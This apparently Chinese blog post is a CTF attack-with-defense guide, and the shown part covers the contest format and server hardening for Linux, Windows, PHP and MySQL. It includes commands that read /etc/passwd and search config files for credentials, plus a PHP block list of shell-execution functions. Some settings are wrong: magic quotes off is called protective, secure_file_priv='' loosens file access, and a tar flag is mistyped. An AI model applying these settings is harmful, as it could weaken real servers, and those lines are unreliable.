@@ -1,0 +1,1128 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Patrick.png">
+  <link rel="icon" href="/img/Patrick.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="W4y2Sh3ll">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AWD比赛指导手册手册版本号：V1.2.2-2023&#x2F;10&#x2F;21 这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~ 0# 什么是AWD0.1# AWD赛制介绍「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD 笔记">
+<meta property="og:url" content="https://www.w4y2sh3ll.top/2024/05/24/AWD-%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="W4y2Sh3ll">
+<meta property="og:description" content="AWD比赛指导手册手册版本号：V1.2.2-2023&#x2F;10&#x2F;21 这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~ 0# 什么是AWD0.1# AWD赛制介绍「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The F">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-24T15:52:27.000Z">
+<meta property="article:modified_time" content="2025-04-22T06:44:04.487Z">
+<meta property="article:author" content="W4y2Sh3ll">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="AWDPwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>AWD 笔记 - W4y2Sh3ll</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.w4y2sh3ll.top","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>W4y2Sh3ll</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Kernel/">
+                
+                Kernel
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="AWD 笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-24 23:52" pubdate>
+          2024年5月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          130 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">AWD 笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="AWD比赛指导手册"><a href="#AWD比赛指导手册" class="headerlink" title="AWD比赛指导手册"></a>AWD比赛指导手册</h1><p><strong>手册版本号：V1.2.2-2023&#x2F;10&#x2F;21</strong></p>
+<p>这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~</p>
+<h2 id="0-什么是AWD"><a href="#0-什么是AWD" class="headerlink" title="0# 什么是AWD"></a>0# 什么是AWD</h2><h3 id="0-1-AWD赛制介绍"><a href="#0-1-AWD赛制介绍" class="headerlink" title="0.1# AWD赛制介绍"></a>0.1# AWD赛制介绍</h3><p>「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。</p>
+<p>在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。</p>
+<p>主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。</p>
+<h3 id="0-2-比赛整体流程"><a href="#0-2-比赛整体流程" class="headerlink" title="0.2# 比赛整体流程"></a>0.2# 比赛整体流程</h3><ul>
+<li>赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 <code>SSH</code> 或者 <code>VNC</code> 的用户名和密码，还有相关IP等信息</li>
+<li>安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份&#x2F;弱口令修改&#x2F;代码审计和修复&#x2F;漏洞修复等）</li>
+<li>自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令&#x2F;Web漏洞&#x2F;系统漏洞等）获得Flag进行加分，对应队伍失分</li>
+</ul>
+<h2 id="1-比赛环境"><a href="#1-比赛环境" class="headerlink" title="1# 比赛环境"></a>1# 比赛环境</h2><p>通常比赛环境有以下三种情况：</p>
+<ul>
+<li>混合靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Win靶机 <code>Windows Server 2003/2008/2012</code> 或者 <code>Windows 7</code> + Linux靶机 <code>Centos7.x</code> 或者 <code>Ubuntu 16.04/17.01/20.04</code></li>
+<li>纯Linux靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Linux靶机 <code>Centos7.x</code> 或者 <code>Ubuntu 16.04/17.01/20.04</code></li>
+<li>纯Windows靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Win靶机 <code>Windows Server 2003/2008/2012</code> 或者 <code>Windows 7</code></li>
+</ul>
+<p>可能有师傅这里看不太懂，那我可以用大白话描述一下：比赛的时候，会给你1~2台运维机器（一般是Win10里面装了Kali）以及好几台服务器（也就是上面说的靶机），服务器上面有漏洞，要先抓紧去找到漏洞并修复（可别忘了弱口令哦），再通过找到的漏洞去攻击别的队伍的服务器拿到Flag从而得分</p>
+<h2 id="2-安全加固环节（Defense）"><a href="#2-安全加固环节（Defense）" class="headerlink" title="2# 安全加固环节（Defense）"></a>2# 安全加固环节（Defense）</h2><h3 id="2-0-基本加固流程"><a href="#2-0-基本加固流程" class="headerlink" title="2.0# 基本加固流程"></a>2.0# 基本加固流程</h3><h4 id="2-0-1-Windows加固流程"><a href="#2-0-1-Windows加固流程" class="headerlink" title="2.0.1 Windows加固流程"></a>2.0.1 Windows加固流程</h4><p>先备份：Web源码、数据库</p>
+<ol>
+<li>445加固，开启防火墙或IP高级安全策略</li>
+<li>开启系统日志审计功能</li>
+<li>禁用guest账户、关闭文件共享</li>
+<li>确保启动项内容是可控的</li>
+<li>限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置–&gt;管理模板–&gt;Windows组件–&gt;远程桌面服务–&gt;远程桌面会话主机–&gt;连接–&gt;限制连接的数量</li>
+<li>使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe</li>
+<li>恶意代码文件，通过PCHunter、Monitor查找</li>
+<li>Web目录环境查找相关可疑文件：jpg&#x2F;png&#x2F;rar，查看属性、解压看文件内容</li>
+<li>NTFS扫描磁盘查找隐藏的交换流数据</li>
+<li>查找系统所有账户信息，禁止非Administrator账户</li>
+<li>修改Web站点管理员访问路径、默认口令、数据库口令</li>
+<li>安装WAF脚本，防护Web站点，禁止其他漏洞</li>
+</ol>
+<h4 id="2-0-2-Linux加固流程"><a href="#2-0-2-Linux加固流程" class="headerlink" title="2.0.2 Linux加固流程"></a>2.0.2 Linux加固流程</h4><p>先备份：Web源码、数据库</p>
+<ol>
+<li>系统口令修改，团队统一口令</li>
+<li>通过 <code>.bash_history</code> 查找历史命令操作，发现痕迹</li>
+<li>查看计划任务：<code>crontab -l</code>；编辑计划任务：<code>crontab -e</code></li>
+<li>查看 <code>/etc/init.d/rc.local</code> 中启动服务有无异常</li>
+<li>使用脚本开启进程监控、目录监控、流量监控</li>
+<li>Web站点口令,站点管理员路径修改</li>
+<li>系统加固：iptable</li>
+</ol>
+<h3 id="2-1-基本信息搜集"><a href="#2-1-基本信息搜集" class="headerlink" title="2.1# 基本信息搜集"></a>2.1# 基本信息搜集</h3><p>在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆”</p>
+<h4 id="2-1-1-明确Linux机器信息"><a href="#2-1-1-明确Linux机器信息" class="headerlink" title="2.1.1 明确Linux机器信息"></a>2.1.1 明确Linux机器信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">uname -a                       <span class="hljs-comment">//系统信息</span><br>ps -aux                        <span class="hljs-comment">//查询进程信息</span><br>ps -ef | grep 进程名称         <span class="hljs-comment">//筛选指定进程</span><br>id                             <span class="hljs-comment">//用于显示用户ID，以及所属群组ID</span><br>cat /etc/passwd                <span class="hljs-comment">//查看用户情况</span><br>ls /home/                      <span class="hljs-comment">//查看用户情况</span><br>find / -type d -perm <span class="hljs-number">-002</span>      <span class="hljs-comment">//可写目录检查</span><br>ifconfig                       <span class="hljs-comment">//Linux上查看网卡信息</span><br>ip addr show                   <span class="hljs-comment">//Linux上查看网卡信息</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-1-2-明确Windows机器信息"><a href="#2-1-2-明确Windows机器信息" class="headerlink" title="2.1.2 明确Windows机器信息"></a>2.1.2 明确Windows机器信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /all                    <span class="hljs-comment">//Windows上查看用户详细信息</span><br>ipconfig  /all                 <span class="hljs-comment">//Windows上查看网卡信息</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-1-3-查看开放端口"><a href="#2-1-3-查看开放端口" class="headerlink" title="2.1.3 查看开放端口"></a>2.1.3 查看开放端口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat                                                       <span class="hljs-comment">//查看活动连接</span><br>netstat -ano/-a                                               <span class="hljs-comment">//查看端口情况</span><br>netstat -anp                                                  <span class="hljs-comment">//查看端口</span><br>firewall-cmd --zone= public --remove-port=<span class="hljs-number">80</span>/tcp –permanent   <span class="hljs-comment">//关闭端口</span><br>firewall-cmd –reload                                          <span class="hljs-comment">//防火墙重启</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-1-4-默认口令（弱口令）更改"><a href="#2-1-4-默认口令（弱口令）更改" class="headerlink" title="2.1.4 默认口令（弱口令）更改"></a>2.1.4 默认口令（弱口令）更改</h4><p>为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456</p>
+<p>还有其他默认密码admin，top100， top1000等</p>
+<p><strong>尤其是WEB应用的后台密码修改</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">passwd username                                                  <span class="hljs-comment">//ssh口令修改</span><br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> mycms@localhost = password(<span class="hljs-string">&#x27;18ciweufhi28746&#x27;</span>);  <span class="hljs-comment">//MySQL密码修改</span><br>find /var/www<span class="hljs-comment">//html -path &#x27;*config*’                             //查找配置文件中的密码凭证</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-1-5-找本地Flag"><a href="#2-1-5-找本地Flag" class="headerlink" title="2.1.5 找本地Flag"></a>2.1.5 找本地Flag</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">grep -r <span class="hljs-string">&quot;flag&quot;</span> /var/www/html/  <span class="hljs-comment">//Linux：在Web目录下查找flag</span><br>findstr /s /i <span class="hljs-string">&quot;flag&quot;</span> *.*       <span class="hljs-comment">//Windows：当前目录以及所有子目录下的所有文件中查找&quot;flag&quot;这个字符串</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-1-6-设置禁Ping"><a href="#2-1-6-设置禁Ping" class="headerlink" title="2.1.6 设置禁Ping"></a>2.1.6 设置禁Ping</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     <span class="hljs-comment">//临时开启禁ping</span><br>echo <span class="hljs-string">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     <span class="hljs-comment">//关闭禁ping</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-Web安全加固"><a href="#2-2-Web安全加固" class="headerlink" title="2.2# Web安全加固"></a>2.2# Web安全加固</h3><h4 id="2-2-1-备份源码"><a href="#2-2-1-备份源码" class="headerlink" title="2.2.1 备份源码"></a>2.2.1 备份源码</h4><p>防止在对源码进行修改时出问题，或者被攻击方删除源码而准备</p>
+<p>压缩源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">tar -cvf web.tar /var/www/html<br>zip -q -r web.zip /var/www/html<br></code></pre></td></tr></table></figure>
+
+<p>解压缩源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">tar -xvf web.tar -c /var/www/html<br>unzip web.zip -d /var/www/html<br></code></pre></td></tr></table></figure>
+
+<p>备份源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">mv web.tar /tmp<br>mv web.zip /home/xxx<br></code></pre></td></tr></table></figure>
+
+<p>上传和下载源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">scp username@servername:/path/filename /tmp/local_destination  <span class="hljs-comment">//从服务器下载单个文件到本地</span><br>scp /path/local_filename username@servername:/path             <span class="hljs-comment">//从本地上传单个文件到服务器</span><br>scp -r username@servername:remote_dir/ /tmp/local_dir          <span class="hljs-comment">//从服务器下载整个目录到本地</span><br>scp -r /tmp/local_dir username@servername:remote_dir           <span class="hljs-comment">//从本地上传整个目录到服务器</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-2-2-设置只读权限"><a href="#2-2-2-设置只读权限" class="headerlink" title="2.2.2 设置只读权限"></a>2.2.2 设置只读权限</h4><p>对Web文件设置只读和执行权限（PHP等动态语言需要执行权限）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chmod <span class="hljs-number">0555</span> /var/www/html<span class="hljs-comment">/*</span><br><span class="hljs-comment">chmod 0555 /var/www/html/*.php</span><br></code></pre></td></tr></table></figure>
+
+<p>Web根目录设置只读和执行权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">chmod <span class="hljs-number">0555</span> /var/www/html<br></code></pre></td></tr></table></figure>
+
+<p>改变文件的属主和属组来设置严格的权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chown -R root:root /var/www/html/        <span class="hljs-comment">//设置拥有人为 root:root 或 httpd:httpd (推荐)</span><br>chown -R apache:apache /var/www/html/    <span class="hljs-comment">//确保 apache 拥有 /var/www/html/</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-2-3-配置-htaccess"><a href="#2-2-3-配置-htaccess" class="headerlink" title="2.2.3 配置 .htaccess"></a>2.2.3 配置 <code>.htaccess</code></h4><p>利用 <code>.htaccess</code> 配置文件禁止php文件执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-built_in">Directory</span> <span class="hljs-string">&quot;/var/www/html/upload&quot;</span>&gt;   <span class="hljs-comment">//指定目录后续的指令将应用于该目录</span><br>Options -ExecCGI -Indexes            <span class="hljs-comment">//禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。</span><br>AllowOverride None                   <span class="hljs-comment">//不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。</span><br>RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  <br>RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      <br><span class="hljs-comment">//这两个指令移除指定文件扩展名的处理器和类型。</span><br><span class="hljs-comment">//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。</span><br>php_flag engine off     <span class="hljs-comment">//这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。</span><br>&lt;FilesMatch <span class="hljs-string">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span>&gt;<br>deny <span class="hljs-keyword">from</span> all<br>&lt;/FilesMatch&gt;  <span class="hljs-comment">//这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有</span><br>&lt;/<span class="hljs-built_in">Directory</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-2-4-PHP参数安全配置"><a href="#2-2-4-PHP参数安全配置" class="headerlink" title="2.2.4 PHP参数安全配置"></a>2.2.4 PHP参数安全配置</h4><p>首先找到PHP的配置文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">/etc/php/&#123;version&#125;/php.ini<br></code></pre></td></tr></table></figure>
+
+<p>禁用高危函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link<br></code></pre></td></tr></table></figure>
+
+<p>配置 <code>open_basedir</code> （将用户访问文件的活动范围限制在指定的区域）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">open_basedir=/<span class="hljs-keyword">var</span>/www/html<br></code></pre></td></tr></table></figure>
+
+<p>禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">magic_quotes_gpc = Off<br></code></pre></td></tr></table></figure>
+
+<p>关闭PHP伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = Off<br>allow_url_include = Off<br></code></pre></td></tr></table></figure>
+
+<p>重启PHP</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service php7<span class="hljs-number">.0</span>-fpm restart<br>sudo systemctl restart php7<span class="hljs-number">.0</span>-fpm.service<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-数据库安全加固"><a href="#2-3-数据库安全加固" class="headerlink" title="2.3# 数据库安全加固"></a>2.3# 数据库安全加固</h3><h4 id="2-3-1-Mysql加固"><a href="#2-3-1-Mysql加固" class="headerlink" title="2.3.1 Mysql加固"></a>2.3.1 Mysql加固</h4><p>为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456</p>
+<ol>
+<li>不使用默认口令，修改成复杂的，并确保和web环境连接</li>
+<li>设置只允许本地127.0.0.1账户登录：修改 <code>bind-address=127.0.0.1</code> ；在配置文件中加入 <code>seccure_file_priv=NULL</code></li>
+<li>开启日志审计功能：<code>general_log_file=</code>路径</li>
+</ol>
+<p>因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令</p>
+<p>备份指定数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqldump –u username –p password databasename <span class="hljs-operator">&gt;</span> target.sql<br></code></pre></td></tr></table></figure>
+
+<p>备份所有数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqldump –<span class="hljs-keyword">all</span> <span class="hljs-operator">-</span>databases <span class="hljs-operator">&gt;</span> all.sql<br></code></pre></td></tr></table></figure>
+
+<p>导入数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql –u username –p password database <span class="hljs-operator">&lt;</span> from.sql<br></code></pre></td></tr></table></figure>
+
+<p>对于MySQL的攻防，可以看这篇文章：<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/26.html">https://blog.zgsec.cn/archives/26.html</a></p>
+<p>MySQL默认配置文件路径：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">C:</span>\\Program Files\MySQL\MySQLServer <span class="hljs-number">5.1</span>\my.ini   <span class="hljs-comment">//Windows</span><br><span class="hljs-keyword">/etc/</span>my.cnf                                      <span class="hljs-comment">//Linux</span><br><span class="hljs-keyword">/etc/</span>mysql/my.cnf                                <span class="hljs-comment">//Linux</span><br></code></pre></td></tr></table></figure>
+
+<p>修改 <code>secure_file_priv</code> 参数（日志功能的对应目录）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">secure_file_priv<span class="hljs-operator">=</span>&quot;&quot;<br></code></pre></td></tr></table></figure>
+
+<p>重载MySQL配置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">FLUSH PRIVILEGES<br></code></pre></td></tr></table></figure>
+
+<p>重启MySQL服务</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service mysql restart<br>sudo systemctl restart mysql<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-3-2-Mssql加固"><a href="#2-3-2-Mssql加固" class="headerlink" title="2.3.2 Mssql加固"></a>2.3.2 Mssql加固</h4><ol>
+<li>删除不必要的账号	</li>
+<li>SQLServer用户口令安全	</li>
+<li>根据用户分配帐号避免帐号共享</li>
+<li>分配数据库用户所需的最小权限</li>
+<li>网络访问限制</li>
+<li>SQLServer登录审计</li>
+<li>SQLServer安全事件审计</li>
+<li>配置日志功能</li>
+</ol>
+<h3 id="2-4-远程控制加固"><a href="#2-4-远程控制加固" class="headerlink" title="2.4# 远程控制加固"></a>2.4# 远程控制加固</h3><h4 id="2-4-1-SSH安全加固"><a href="#2-4-1-SSH安全加固" class="headerlink" title="2.4.1 SSH安全加固"></a>2.4.1 SSH安全加固</h4><p>限制IP登录方法</p>
